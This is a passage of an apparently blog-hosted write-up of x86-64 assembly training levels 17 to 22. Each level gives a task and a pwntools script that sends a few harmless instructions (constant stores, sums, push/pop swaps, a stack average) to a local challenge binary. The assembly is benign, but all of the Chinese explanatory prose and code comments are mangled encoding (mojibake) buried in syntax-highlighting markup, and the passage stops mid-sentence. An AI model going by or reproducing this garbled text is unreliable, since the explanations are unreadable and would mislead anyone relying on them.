class="hljs-built_in">rsi</span>å¯„å­˜å™¨ä¸­ã€‚<br><br>æ ¹æ®å‰é¢æåˆ°çš„ä¿¡æ¯ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br><br>- å°†[<span class="hljs-built_in">rdi</span>]è®¾ç½®ä¸º<span class="hljs-number">0xdeadbeef00001337</span>ã€‚<br>- å°†[<span class="hljs-built_in">rsi</span>]è®¾ç½®ä¸º<span class="hljs-number">0xc0ffee0000</span>ã€‚<br><br>æç¤ºï¼šå¯èƒ½éœ€è¦ä¸€äº›æŠ€å·§å°†ä¸€ä¸ªå¤§å¸¸æ•°èµ‹å€¼ç»™è§£å¼•ç”¨çš„å¯„å­˜å™¨ã€‚  <br>å°è¯•å°†ä¸€ä¸ªå¯„å­˜å™¨è®¾ç½®ä¸ºå¸¸æ•°å€¼ï¼Œç„¶åå°†è¯¥å¯„å­˜å™¨èµ‹å€¼ç»™è§£å¼•ç”¨çš„å¯„å­˜å™¨ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è®¾ç½®å‚æ•°ï¼Œä»¥ä¾¿ä½ ç¼–å†™ä»£ç ï¼š  <br>[<span class="hljs-number">0x404208</span>] = <span class="hljs-number">0xffffffffffffffff</span>  <br>[<span class="hljs-number">0x404c38</span>] = <span class="hljs-number">0xffffffffffffffff</span>  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x404208</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x404c38</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,0xdeadbeef00001337</span><br><span class="hljs-string">       mov [rdi],rax</span><br><span class="hljs-string">       mov rax,0xc0ffee0000</span><br><span class="hljs-string">       mov [rsi],rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="18"><a href="#18" class="headerlink" title="18"></a>18</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">å›æƒ³ä¸€ä¸‹ï¼Œå†…å­˜æ˜¯æŒ‰çº¿æ€§æ–¹å¼å­˜å‚¨çš„ã€‚<br><br>è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ<br><br>å‡è®¾æˆ‘ä»¬è®¿é—®åœ°å€ <span class="hljs-number">0x1337</span> å¤„çš„å››å­—èŠ‚æ•°æ®ï¼š  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00000000deadbeef</span><br><br>å®é™…ä¸Šï¼Œå†…å­˜æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½æŒ‰é¡ºåºå­˜å‚¨çš„ï¼Œé‡‡ç”¨å°ç«¯æ¨¡å¼ï¼š  <br>[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0xef</span>  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">1</span>] = <span class="hljs-number">0xbe</span>  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0xad</span>  <br>...  <br>[<span class="hljs-number">0x1337</span> + <span class="hljs-number">7</span>] = <span class="hljs-number">0x00</span><br><br>è¿™å¯¹æˆ‘ä»¬æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ<br><br>è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åç§»é‡æ¥è®¿é—®ç›¸é‚»çš„æ•°æ®ï¼Œå°±åƒä¸Šé¢å±•ç¤ºçš„é‚£æ ·ã€‚<br><br>å‡è®¾ä½ æƒ³è¦ä»ä¸€ä¸ªåœ°å€ä¸­è·å–ç¬¬<span class="hljs-number">5</span>ä¸ªå­—èŠ‚ï¼Œä½ å¯ä»¥è¿™æ ·è®¿é—®ï¼š  <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [address+<span class="hljs-number">4</span>]<br><br>è¯·è®°ä½ï¼Œåç§»é‡ä»<span class="hljs-number">0</span>å¼€å§‹ã€‚<br><br>æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š  <br>ä»å­˜å‚¨åœ¨ <span class="hljs-built_in">rdi</span> ä¸­çš„åœ°å€ä¸­åŠ è½½ä¸¤ä¸ªè¿ç»­çš„å››å­—æ•°æ®  <br>è®¡ç®—å‰é¢æ­¥éª¤çš„å››å­—æ•°æ®çš„å’Œã€‚  <br>å°†å’Œå­˜å‚¨åœ¨ <span class="hljs-built_in">rsi</span> ä¸­çš„åœ°å€ä¸­<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>[<span class="hljs-number">0x4041a8</span>] = <span class="hljs-number">0xbdc4b</span>  <br>[<span class="hljs-number">0x4041b0</span>] = <span class="hljs-number">0x12b14</span>  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x4041a8</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0x404658</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       mov rax,[rdi]</span><br><span class="hljs-string">       add rax,[rdi+8]</span><br><span class="hljs-string">       mov [rsi],rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="19"><a href="#19" class="headerlink" title="19"></a>19</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ ˆï¼Œè¿™æ˜¯ä¸€ä¸ªåŠ¨æ€æ‰©å±•å’Œæ”¶ç¼©çš„å†…å­˜åŒºåŸŸã€‚ä½ å°†éœ€è¦è¯»å–å’Œå†™å…¥æ ˆï¼Œè¿™å¯èƒ½éœ€è¦ä½ ä½¿ç”¨ <span class="hljs-keyword">pop</span> å’Œ <span class="hljs-keyword">push</span> æŒ‡ä»¤ã€‚ä½ å¯èƒ½è¿˜éœ€è¦ä½¿ç”¨æ ˆæŒ‡é’ˆå¯„å­˜å™¨ (<span class="hljs-built_in">rsp</span>) æ¥äº†è§£æ ˆçš„æŒ‡å‘ä½ç½®ã€‚<br><br>åœ¨è¿™äº›çº§åˆ«ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»æ ˆã€‚<br><br>æ ˆæ˜¯ä¸€ä¸ªå¯ä»¥å­˜å‚¨å€¼ä»¥ä¾›ä»¥åä½¿ç”¨çš„å†…å­˜åŒºåŸŸã€‚<br><br>è¦å°†ä¸€ä¸ªå€¼å­˜å‚¨åœ¨æ ˆä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <span class="hljs-keyword">push</span> æŒ‡ä»¤ï¼›è¦æ£€ç´¢ä¸€ä¸ªå€¼ï¼Œæˆ‘ä»¬ä½¿ç”¨ <span class="hljs-keyword">pop</span> æŒ‡ä»¤ã€‚<br><br>æ ˆæ˜¯ä¸€ç§åè¿›å…ˆå‡º (LIFO) çš„å†…å­˜ç»“æ„ï¼Œè¿™æ„å‘³ç€æœ€åä¸€ä¸ªè¢«æ¨å…¥çš„å€¼å°†ç¬¬ä¸€ä¸ªè¢«å¼¹å‡ºã€‚<br><br>æƒ³è±¡ä¸€ä¸‹ä»æ´—ç¢—æœºä¸­å¸è½½ç›˜å­ï¼Œå‡è®¾æœ‰ä¸€ä¸ªçº¢è‰²çš„ã€ä¸€ä¸ªç»¿è‰²çš„å’Œä¸€ä¸ªè“è‰²çš„ç›˜å­ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†çº¢è‰²ç›˜å­æ”¾åœ¨æŸœå­é‡Œï¼Œç„¶åå°†ç»¿è‰²ç›˜å­æ”¾åœ¨çº¢è‰²ç›˜å­ä¸Šé¢ï¼Œæœ€åæ”¾ç½®è“è‰²ç›˜å­ã€‚<br><br>æˆ‘ä»¬çš„ç›˜å­æ ˆçœ‹èµ·æ¥åƒè¿™æ ·ï¼š<br>  é¡¶éƒ¨ ----&gt; è“è‰²ç›˜å­<br>              ç»¿è‰²ç›˜å­<br>  åº•éƒ¨ -&gt; çº¢è‰²ç›˜å­<br><br>ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä¸€ä¸ªç›˜å­æ¥åšä¸‰æ˜æ²»ï¼Œæˆ‘ä»¬å°†ä»æ ˆä¸­æ£€ç´¢é¡¶éƒ¨çš„ç›˜å­ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ªæ”¾å…¥æŸœå­çš„è“è‰²ç›˜å­ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå¼¹å‡ºçš„ç›˜å­ã€‚<br><br>åœ¨x86ä¸­ï¼Œ<span class="hljs-keyword">pop</span> æŒ‡ä»¤å°†ä»æ ˆé¡¶å–å‡ºå€¼å¹¶æ”¾å…¥ä¸€ä¸ªå¯„å­˜å™¨ä¸­ã€‚<br><br>ç±»ä¼¼åœ°ï¼Œ<span class="hljs-keyword">push</span> æŒ‡ä»¤å°†å¯„å­˜å™¨ä¸­çš„å€¼æ¨å…¥æ ˆçš„é¡¶éƒ¨ã€‚<br><br>ä½¿ç”¨è¿™äº›æŒ‡ä»¤ï¼Œå–å‡ºæ ˆé¡¶çš„å€¼ï¼Œå‡å» <span class="hljs-built_in">rdi</span> çš„å€¼ï¼Œç„¶åå°†ç»“æœæ”¾å›æ ˆä¸­ã€‚<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š<br>  <span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x100d3</span><br>  (æ ˆ) [<span class="hljs-number">0x7fffff1ffff8</span>] = <span class="hljs-number">0x30267be3</span><br></code></pre></td></tr></table></figure><p>å–å‡ºæ ˆé¡¶çš„å€¼ï¼Œå‡å» rdi çš„å€¼ï¼Œç„¶åå°†ç»“æœæ”¾å›æ ˆä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       pop rax</span><br><span class="hljs-string">       sub rax,rdi</span><br><span class="hljs-string">       push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="20"><a href="#20" class="headerlink" title="20"></a>20</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ ˆï¼Œè¿™æ˜¯ä¸€ä¸ªåŠ¨æ€æ‰©å±•å’Œæ”¶ç¼©çš„å†…å­˜åŒºåŸŸã€‚ä½ å°†éœ€è¦è¯»å–å’Œå†™å…¥æ ˆï¼Œè¿™å¯èƒ½éœ€è¦ä½ ä½¿ç”¨ <span class="hljs-keyword">pop</span> å’Œ <span class="hljs-keyword">push</span> æŒ‡ä»¤ã€‚ä½ å¯èƒ½è¿˜éœ€è¦ä½¿ç”¨æ ˆæŒ‡é’ˆå¯„å­˜å™¨ (<span class="hljs-built_in">rsp</span>) æ¥äº†è§£æ ˆçš„æŒ‡å‘ä½ç½®ã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œæˆ‘ä»¬å°†æ¢ç´¢æ ˆçš„åè¿›å…ˆå‡º (LIFO) ç‰¹æ€§ã€‚<br><br>åªèƒ½ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š  <br><span class="hljs-keyword">push</span>ã€<span class="hljs-keyword">pop</span><br><br>äº¤æ¢ <span class="hljs-built_in">rdi</span> å’Œ <span class="hljs-built_in">rsi</span> ä¸­çš„å€¼ã€‚  <br>ä¾‹å¦‚ï¼Œ  <br>å¦‚æœèµ·å§‹æ—¶ <span class="hljs-built_in">rdi</span> = <span class="hljs-number">2</span>ï¼Œ<span class="hljs-built_in">rsi</span> = <span class="hljs-number">5</span>  <br>é‚£ä¹ˆæœ€ç»ˆ <span class="hljs-built_in">rdi</span> = <span class="hljs-number">5</span>ï¼Œ<span class="hljs-built_in">rsi</span> = <span class="hljs-number">2</span><br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br><span class="hljs-built_in">rdi</span> = <span class="hljs-number">0x7ff3244</span>  <br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0xa71fcb2</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       push rdi</span><br><span class="hljs-string">       push rsi</span><br><span class="hljs-string">       pop rdi</span><br><span class="hljs-string">       pop rsi </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="21"><a href="#21" class="headerlink" title="21"></a>21</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">åœ¨ä¹‹å‰çš„çº§åˆ«ä¸­ï¼Œä½ ä½¿ç”¨ <span class="hljs-keyword">push</span> å’Œ <span class="hljs-keyword">pop</span> æ¥å°†æ•°æ®å­˜å‚¨åˆ°æ ˆä¸­å’Œä»æ ˆä¸­åŠ è½½æ•°æ®ã€‚<br><br>ç„¶è€Œï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ ˆæŒ‡é’ˆæ¥è®¿é—®æ ˆã€‚<br><br>åœ¨ x86 ä¸­ï¼Œæ ˆæŒ‡é’ˆå­˜å‚¨åœ¨ç‰¹æ®Šå¯„å­˜å™¨ <span class="hljs-built_in">rsp</span> ä¸­ã€‚  <br><span class="hljs-built_in">rsp</span> æ€»æ˜¯å­˜å‚¨æ ˆé¡¶çš„å†…å­˜åœ°å€ï¼Œå³æœ€åä¸€ä¸ªè¢«æ¨å…¥çš„å€¼çš„å†…å­˜åœ°å€ã€‚<br><br>ç±»ä¼¼äºå†…å­˜çº§åˆ«ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ [<span class="hljs-built_in">rsp</span>] æ¥è®¿é—® <span class="hljs-built_in">rsp</span> ä¸­å­˜å‚¨çš„å†…å­˜åœ°å€ä¸Šçš„å€¼ã€‚<br><br>è¯·åœ¨ä¸ä½¿ç”¨ <span class="hljs-keyword">pop</span> çš„æƒ…å†µä¸‹è®¡ç®—æ ˆä¸Šå­˜å‚¨çš„è¿ç»­å››ä¸ªå››å­—èŠ‚çš„å¹³å‡å€¼ã€‚<br><br>å°†å¹³å‡å€¼æ¨å…¥æ ˆä¸­ã€‚<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">Hint:</span><br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> A<br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> B<br>  <span class="hljs-built_in">RSP</span>+0x?? Quad <span class="hljs-built_in">Word</span> C<br>  <span class="hljs-built_in">RSP</span>      Quad <span class="hljs-built_in">Word</span> D<br><br>ç°åœ¨ï¼Œæˆ‘ä»¬å°†è¿›è¡Œä»¥ä¸‹è®¾ç½®ä»¥å‡†å¤‡ä½ çš„ä»£ç ï¼š  <br>(æ ˆ) [<span class="hljs-number">0x7fffff200000</span>:<span class="hljs-number">0x7fffff1fffe0</span>] = [<span class="hljs-string">&#x27;0xeb77e0b&#x27;</span>, <span class="hljs-string">&#x27;0x1e082933&#x27;</span>, <span class="hljs-string">&#x27;0x2ec86967&#x27;</span>, <span class="hljs-string">&#x27;0x392a5137&#x27;</span>]ï¼ˆäº‹ç‰©åˆ—è¡¨ï¼‰<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ <code>[rsp]</code> æ¥è®¿é—® rsp ä¸­å­˜å‚¨çš„å†…å­˜åœ°å€ä¸Šçš„å€¼</li><li>åœ¨ä¸ä½¿ç”¨ pop çš„æƒ…å†µä¸‹è®¡ç®—æ ˆä¸Šå­˜å‚¨çš„è¿ç»­å››ä¸ªå››å­—èŠ‚çš„å¹³å‡å€¼</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># è®¾ç½®æ¶æ„</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¯¹è±¡å¹¶è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br>p = process(<span class="hljs-string">&#x27;/challenge/run&#x27;</span>)<br><br><span class="hljs-comment"># æ¥æ”¶å¹¶ä¸¢å¼ƒä¸€è¡Œè¾“å‡º</span><br>p.recvline()<br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">       xor rax,rax</span><br><span class="hljs-string">       add rax,[rsp]</span><br><span class="hljs-string">       add rax,[rsp+8]</span><br><span class="hljs-string">       add rax,[rsp+16]</span><br><span class="hljs-string">       add rax,[rsp+24]</span><br><span class="hljs-string">       mov rdi,4</span><br><span class="hljs-string">       div rdi</span><br><span class="hljs-string">       push rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æ±‡ç¼–æŒ‡ä»¤ç»™è¿›ç¨‹</span><br>p.send(shellcode)<br><br><span class="hljs-comment"># æ‰“å°è¿›ç¨‹çš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(p.readallS())<br></code></pre></td></tr></table></figure><h1 id="22"><a href="#22" class="headerlink" title="22"></a>22</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶æµæ“ä½œã€‚è¿™æ¶‰åŠä½¿ç”¨æŒ‡ä»¤ç›´æ¥æˆ–é—´æ¥åœ°æ§åˆ¶ç‰¹æ®Šå¯„å­˜å™¨Â `rip`ï¼Œå³æŒ‡ä»¤æŒ‡é’ˆã€‚ä½ å°†ä½¿ç”¨ <span class="hljs-keyword">jmpã€callã€cmp </span>ç­‰æŒ‡ä»¤åŠå…¶æ›¿ä»£æŒ‡ä»¤æ¥å®ç°æ‰€éœ€çš„è¡Œä¸ºã€‚<br><br>ä¹‹å‰ï¼Œä½ å­¦ä¹ äº†å¦‚ä½•ä»¥ä¼ªæ§åˆ¶çš„æ–¹å¼æ“ä½œæ•°æ®ï¼Œä½†æ˜¯ x86 æä¾›äº†ç›´æ¥æ“ä½œæ§åˆ¶æµçš„å®é™…æŒ‡ä»¤ã€‚<br><br>æœ‰ä¸¤ç§ä¸»è¦çš„æ§åˆ¶æµæ“ä½œæ–¹å¼ï¼š  <br>é€šè¿‡è·³è½¬ï¼ˆ<span class="hljs-keyword">jumpï¼‰ï¼› </span> <br>é€šè¿‡è°ƒç”¨ï¼ˆcallï¼‰ã€‚<br><br>åœ¨è¿™ä¸ªçº§åˆ«ä¸­ï¼Œä½ å°†ä½¿ç”¨è·³è½¬æŒ‡ä»¤ã€‚<br><br>è·³è½¬æŒ‡ä»¤æœ‰ä¸¤ç§ç±»å‹ï¼š  <br>æ— æ¡ä»¶è·³è½¬ï¼ˆunconditional <span class="hljs-keyword">jumpsï¼‰ </span> <br>æœ‰æ¡ä»¶è·³è½¬ï¼ˆconditional <span class="hljs-keyword">jumpsï¼‰</span><br><span class="hljs-keyword"></span><br>æ— æ¡ä»¶è·³è½¬æ€»æ˜¯è§¦å‘çš„ï¼Œä¸åŸºäºå…ˆå‰æŒ‡ä»¤çš„ç»“æœã€‚<br><br>æ­£å¦‚ä½ æ‰€çŸ¥ï¼Œå†…å­˜ä½ç½®å¯ä»¥å­˜å‚¨æ•°æ®å’ŒæŒ‡ä»¤ã€‚<br><br>ä½ çš„ä»£ç 